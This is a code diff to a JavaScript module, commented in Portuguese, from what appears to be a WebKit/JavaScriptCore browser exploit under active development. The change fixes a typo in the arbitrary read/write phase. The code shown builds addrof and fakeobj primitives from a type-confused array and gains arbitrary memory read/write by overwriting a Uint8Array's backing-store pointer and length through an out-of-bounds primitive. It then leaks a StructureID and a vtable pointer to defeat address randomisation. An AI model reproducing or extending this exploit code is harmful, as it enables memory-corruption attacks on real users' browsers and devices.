@@ -1,10 +1,8 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v117 - R77 TypedArray Backing Store Corruption for Arb R/W)
+// js/script3/testArrayBufferVictimCrash.mjs (v118 - R78 Correção de Typos e Pequenos Ajustes)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// - Abandona a primitiva 'fakeobj' para L/E arbitrária na Fase 5.
-// - Implementa leitura/escrita arbitrária na Fase 5 corrompendo o backing store (m_vector)
-//   de um Uint8Array usando a primitiva OOB existente.
-// - Isso deve fornecer uma primitiva de L/E mais robusta e direta.
+// - Correção do typo "arb_rw_array_ab_ab_view_addr" para "arb_rw_array_ab_view_addr".
+// - Pequenos ajustes nos logs para maior clareza.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -12,16 +10,15 @@ import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     getOOBDataView,
-    oob_read_absolute, // Importar diretamente
-    oob_write_absolute // Importar diretamente
+    oob_read_absolute, 
+    oob_write_absolute 
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 // Nome do módulo atualizado para refletir a nova tentativa de correção
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v117_R77_BackingStoreCorrupt";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v118_R78_FixTypo";
 
 // --- Funções de Conversão (Double <-> Int64) ---
-// Estas são úteis para addrof/fakeobj primitivas, mas a arb_read/write direta não usará double<->int64
 function int64ToDouble(int64) {
     const buf = new ArrayBuffer(8);
     const u32 = new Uint32Array(buf);
@@ -43,7 +40,7 @@ function doubleToInt64(double) {
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Corrupção de Backing Store ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Corrupção de Backing Store (Typos Corrigidos) ---`, "test");
 
     let final_result = {
         success: false,
@@ -55,10 +52,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     let confused_array;
     let victim_array;
     let addrof_func;
-    let fakeobj_func; // Será usada APENAS para setup do leaker na Fase 4
+    let fakeobj_func; 
 
     // A primitiva arbitrária real será baseada no Uint8Array corruptível
-    let arb_rw_array = null; // O TypedArray cuja backing store será corrompida
+    let arb_rw_array = null; 
 
     // As funções de leitura/escrita arbitrária para a Fase 5 e em diante
     let arb_read_stable = null;
@@ -74,7 +71,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                 victim_array[0] = obj;
                 return doubleToInt64(confused_array[0]);
             };
-            fakeobj_func = (addr) => { // fakeobj_func ainda é necessário para arb_rw_array setup
+            fakeobj_func = (addr) => { 
                 confused_array[0] = int64ToDouble(addr);
                 return victim_array[0];
             };
@@ -87,8 +84,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");
 
         setupAddrofFakeobj(); 
-        // As primitivas arb_read_final_func / arb_write_final_func da Fase 4
-        // ainda usarão leaker.obj_prop = fakeobj_func(addr);
+        
         let leaker_phase4 = { obj_prop: null, val_prop: 0 };
         const arb_read_phase4 = (addr, size_bytes = 8) => { 
             leaker_phase4.obj_prop = fakeobj_func(addr);
@@ -98,7 +94,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         const arb_write_phase4 = (addr, value, size_bytes = 8) => { 
             leaker_phase4.obj_prop = fakeobj_func(addr);
             if (size_bytes === 4) {
-                leaker_phase4.val_prop = Number(value) & 0xFFFFFFFF; // Direto para double
+                leaker_phase4.val_prop = Number(value) & 0xFFFFFFFF; 
             } else {
                 leaker_phase4.val_prop = int64ToDouble(value);
             }
@@ -138,8 +134,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         victim_array = null;
         addrof_func = null;
         fakeobj_func = null; 
-        leaker_phase4 = null; // Limpa o leaker da fase 4
-        arb_rw_array = null; // Garante que esteja limpo antes da nova alocação
+        leaker_phase4 = null; 
+        arb_rw_array = null; 
 
         await PAUSE_S3(200); 
 
@@ -153,8 +149,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // --- Warm-up do addrof/fakeobj (no novo ambiente) ---
         logS3("--- Warm-up: Realizando operações de Addrof/Fakeobj de teste para estabilizar... ---", "info");
         const warm_up_obj = { w: 1 };
-        addrof_func(warm_up_obj); // Apenas chama para aquecer
-        fakeobj_func(new AdvancedInt64(0x1000, 0)); // Apenas chama para aquecer
+        addrof_func(warm_up_obj); 
+        fakeobj_func(new AdvancedInt64(0x1000, 0)); 
         logS3("Warm-up Addrof/Fakeobj concluído.", "info");
         await PAUSE_S3(50); 
 
@@ -163,22 +159,18 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // ============================================================================
         logS3("--- FASE 5.1: Construindo Primitiva de L/E Estável (Corrupção de Backing Store) ---", "subtest");
 
-        // 1. Criar um Uint8Array (ou outro TypedArray) que será nossa vítima para corrupção.
-        // O tamanho aqui não importa tanto, pois vamos sobrescrever o m_length de qualquer forma.
-        arb_rw_array = new Uint8Array(0x1000); // Ex: 4KB de tamanho inicial
+        arb_rw_array = new Uint8Array(0x1000); 
         logS3(`    arb_rw_array criado. Endereço interno será corrompido.`, "info");
 
-        // 2. Obter o endereço do ArrayBufferView interno do arb_rw_array usando addrof_func
         const arb_rw_array_ab_view_addr = addrof_func(arb_rw_array);
         logS3(`    Endereço do ArrayBufferView de arb_rw_array: ${arb_rw_array_ab_view_addr.toString(true)}`, "leak");
 
-        // 3. Obter o DataView OOB global
         const oob_dv = getOOBDataView();
         if (!oob_dv) throw new Error("DataView OOB não está disponível após re-inicialização.");
 
-        // 4. Salvar o m_vector original e m_length do arb_rw_array (para possível restauração)
         const arb_rw_array_m_vector_orig_ptr_addr = arb_rw_array_ab_view_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);
-        const arb_rw_array_m_length_orig_ptr_addr = arb_rw_array_ab_ab_view_addr.add(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET); // Correção de typo aqui
+        // CORREÇÃO: Typo aqui! Era arb_rw_array_ab_ab_view_addr
+        const arb_rw_array_m_length_orig_ptr_addr = arb_rw_array_ab_view_addr.add(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET); 
         
         const original_m_vector = oob_read_absolute(arb_rw_array_m_vector_orig_ptr_addr, 8);
         const original_m_length = oob_read_absolute(arb_rw_array_m_length_orig_ptr_addr, 4);
@@ -186,39 +178,34 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3(`    Original m_vector de arb_rw_array: ${original_m_vector.toString(true)}`, "info");
         logS3(`    Original m_length de arb_rw_array: ${toHex(original_m_length)}`, "info");
 
-        // 5. Definir as novas primitivas estáveis de leitura/escrita arbitrária
         arb_read_stable = (address, size_bytes) => {
-            // Corromper o m_vector do arb_rw_array para apontar para 'address'
             oob_write_absolute(arb_rw_array_m_vector_orig_ptr_addr, address, 8);
-            // Corromper o m_length do arb_rw_array para ser 0xFFFFFFFF (max length)
-            oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, 0xFFFFFFFF, 4);
+            oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, 0xFFFFFFFF, 4); // Max length
 
             let result;
-            if (size_bytes === 1) result = arb_rw_array[0];
-            else if (size_bytes === 2) result = new DataView(arb_rw_array.buffer).getUint16(0, true);
-            else if (size_bytes === 4) result = new DataView(arb_rw_array.buffer).getUint32(0, true);
-            else if (size_bytes === 8) result = doubleToInt64(new DataView(arb_rw_array.buffer).getFloat64(0, true));
+            const dv = new DataView(arb_rw_array.buffer); // Usar DataView no buffer corruptível
+            if (size_bytes === 1) result = arb_rw_array[0]; // Uint8Array pode ler byte a byte
+            else if (size_bytes === 2) result = dv.getUint16(0, true);
+            else if (size_bytes === 4) result = dv.getUint32(0, true);
+            else if (size_bytes === 8) result = doubleToInt64(dv.getFloat64(0, true));
             else throw new Error("Tamanho de leitura inválido para arb_read_stable.");
 
-            // Restaurar o m_vector e m_length originais (IMPORTANTE para evitar travamentos ou corrupção)
             oob_write_absolute(arb_rw_array_m_vector_orig_ptr_addr, original_m_vector, 8);
             oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, original_m_length, 4);
             return result;
         };
 
         arb_write_stable = (address, value, size_bytes) => {
-            // Corromper o m_vector do arb_rw_array para apontar para 'address'
             oob_write_absolute(arb_rw_array_m_vector_orig_ptr_addr, address, 8);
-            // Corromper o m_length do arb_rw_array para ser 0xFFFFFFFF (max length)
-            oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, 0xFFFFFFFF, 4);
+            oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, 0xFFFFFFFF, 4); // Max length
 
+            const dv = new DataView(arb_rw_array.buffer); // Usar DataView no buffer corruptível
             if (size_bytes === 1) arb_rw_array[0] = value;
-            else if (size_bytes === 2) new DataView(arb_rw_array.buffer).setUint16(0, value, true);
-            else if (size_bytes === 4) new DataView(arb_rw_array.buffer).setUint32(0, value, true);
-            else if (size_bytes === 8) new DataView(arb_rw_array.buffer).setFloat64(0, int64ToDouble(value), true);
+            else if (size_bytes === 2) dv.setUint16(0, value, true);
+            else if (size_bytes === 4) dv.setUint32(0, value, true);
+            else if (size_bytes === 8) dv.setFloat64(0, int64ToDouble(value), true);
             else throw new Error("Tamanho de escrita inválido para arb_write_stable.");
 
-            // Restaurar o m_vector e m_length originais
             oob_write_absolute(arb_rw_array_m_vector_orig_ptr_addr, original_m_vector, 8);
             oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, original_m_length, 4);
         };
@@ -230,7 +217,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // TESTE DE COERÊNCIA DE L/E NA FASE 5 (usando arb_write_stable)
         // ============================================================================
         logS3("--- TESTE DE COERÊNCIA (Fase 5): Escrita Arbitrária ESTÁVEL vs. Leitura JS Normal ---", "subtest");
-        const coherence_test_val = 0xAAAAAAAA; // Valor que esperamos ver em leak_target_obj.f (32-bit)
+        const coherence_test_val = 0xAAAAAAAA; 
         const prop_f_offset = 0x10; 
         const prop_f_addr = leak_target_addr.add(prop_f_offset); 
 
@@ -314,9 +301,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             logS3(`[DECISÃO] Usando StructureID encontrado pelo scanner em ${toHex(JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET)}: ${toHex(actual_structure_id)}`, "info");
             
             // Para resolver o ponteiro da Structure, precisamos do webkit_base_addr e STRUCTURE_TABLE_OFFSET_FROM_WEBKIT_BASE.
-            // Para testar, vamos assumir que o webkit_base_addr virá do vazamento de put_func no final.
-            // Aqui, apenas verificamos se o ID foi encontrado.
-            final_result.message = `StructureID ${toHex(actual_structure_id)} encontrado. Próxima etapa: resolver WebKit Base e Structure Table para obter o ponteiro real da Structure.`;
+            // A lógica de vazamento completo da WebKit será ajustada depois de termos
+            // certeza sobre a leitura do StructureID/Pointer.
+            final_result.message = `StructureID ${toHex(actual_structure_id)} encontrado. Precisamos do WebKit Base Address e da Structure Table Base para resolver o ponteiro da Structure.`;
             final_result.success = true; 
             final_result.webkit_leak_result = { success: false, msg: final_result.message, webkit_base_candidate: null };
             return final_result; 
@@ -328,7 +315,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
         // Continua com a Fase 3 (leitura da vfunc::put) usando o structure_addr encontrado
         const vfunc_put_ptr_addr = structure_addr.add(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
-        const jsobject_put_addr = arb_read_stable(vfunc_put_ptr_addr, 8); // Usando arb_read_stable
+        const jsobject_put_addr = arb_read_stable(vfunc_put_ptr_addr, 8); 
         logS3(`[Etapa 3] Lendo do endereço ${vfunc_put_ptr_addr.toString(true)} (Structure REAL + 0x18) para obter o ponteiro da vfunc...`, "debug");
         logS3(`[Etapa 3] Endereço vazado da função (JSC::JSObject::put): ${jsobject_put_addr.toString(true)}`, "leak");
         if(jsobject_put_addr.low() === 0 && jsobject_put_addr.high() === 0) throw new Error("Ponteiro da função JSC::JSObject::put é NULO ou inválido.");
@@ -355,12 +342,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
         logS3(final_result.message, "critical");
     } finally {
-        // Limpeza de todas as referências para evitar vazamentos e problemas de GC
         confused_array = null;
         victim_array = null;
         addrof_func = null;
         fakeobj_func = null;
-        arb_rw_array = null; // Limpa a referência ao TypedArray corruptível
+        arb_rw_array = null; 
         arb_read_stable = null;
         arb_write_stable = null;
         
